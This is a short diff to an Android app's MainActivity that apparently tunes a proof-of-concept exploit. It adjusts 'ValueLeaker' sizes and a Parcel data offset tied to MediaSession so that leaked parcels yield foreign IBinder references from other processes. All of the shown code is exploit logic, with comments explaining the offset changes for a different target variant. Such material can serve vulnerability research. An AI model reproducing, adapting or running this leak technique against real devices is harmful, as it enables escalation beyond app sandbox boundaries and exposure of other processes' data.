@@ -43,7 +43,10 @@ public class MainActivity extends AppCompatActivity {
             ValueLeakerMaker leakerMaker = new ValueLeakerMaker(this);
             leakerMaker.runWithNestLevels(5, i -> {
                 try {
-                    leakers.add(leakerMaker.makeHolderLeakerWithRewind(56));
+                    // As each ValueLeaker references MediaSession and ValueLeakerMaker has only one
+                    // we need to use separate ValueLeakerMaker for each operation.
+                    // Also, as leaker in this variant is at higher offset, we had to shrink size
+                    leakers.add(new ValueLeakerMaker(this).makeHolderLeakerWithRewind(52));
                 } catch (ReflectiveOperationException | RemoteException e) {
                     e.printStackTrace();
                 }
@@ -72,7 +75,7 @@ public class MainActivity extends AppCompatActivity {
                 for (ValueLeaker leaker : leakers) {
                     Parcel parcel = leaker.doLeak();
                     if (parcel != null) {
-                        parcel.setDataPosition(28);
+                        parcel.setDataPosition(24);
                         IBinder binder = parcel.readStrongBinder();
                         if (binder != null && !(binder instanceof Binder)) {
                             leakedBinders.add(binder);
